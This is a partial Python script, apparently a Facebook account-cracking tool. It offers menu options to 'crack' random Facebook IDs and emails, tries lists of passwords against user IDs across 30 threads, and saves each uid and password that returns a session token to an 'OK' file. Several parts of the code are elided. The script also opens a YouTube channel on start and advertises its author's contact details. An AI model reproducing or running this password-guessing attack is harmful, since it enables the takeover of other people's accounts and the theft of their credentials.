...
class Main:
	def __init__(self):
		...
		os.system("xdg-open https://youtube.com/@ugly_man")
		time.sleep(4)
		os.system("clear")
		os.system("figlet MAHIN")
		print("\n  ( Programmed By 𝐀𝐫𝐚𝐟𝐚𝐭 𝐌𝐚𝐡𝐢𝐧 )") 
		print("\n  ( Facebook : 𝐀𝐫𝐚𝐟𝐚𝐭 𝐌𝐚𝐡𝐢𝐧 )") 
		print("\n  ( WhatsApp +01925798757 )") 
		print(" ( https://github.com/arafat-mahin310)\n") 
		
		print("         [ No Login Facebook ]")
		print(" -------------------------------------")

		print(" -------------------------------------")
		print("\n [01]. crack random id facebook new( 𝐀𝐫𝐚𝐟𝐚𝐭 𝐌𝐚𝐡𝐢𝐧 )")
		print(" [02]. crack random id facebook young( 𝐀𝐫𝐚𝐟𝐚𝐭 𝐌𝐚𝐡𝐢𝐧 )")
		print(" [03]. crack random id facebook old( 𝐀𝐫𝐚𝐟𝐚𝐭 𝐌𝐚𝐡𝐢𝐧 )")
		print(" [04]. crack random email facebook ( 𝐀𝐫𝐚𝐟𝐚𝐭 𝐌𝐚𝐡𝐢𝐧 )")
		print(" [05]. report")
		tanya = input("\n [•] choose : ")
		if tanya in ["", " "]:
			Main()
	...
	def fbbaru(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [•] use comma <,> for separator\n [•] Example  : arafatmahin123~123456,123456789")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r [CRACK] %s/%s -> [Mr.Mahin-OK]:-%s - [Mr.Mahin-CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[Mr.Mahin-CP] %s • %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s • %s"%(uid, pw))
				open("OK-"+tgl+".txt","a").write("%s | %s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[Mr.Mahin-CP] %s • %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print(" [•] GITHUB : https://github.com/arafat-mahin310")
		exit()
	else:
		Main()
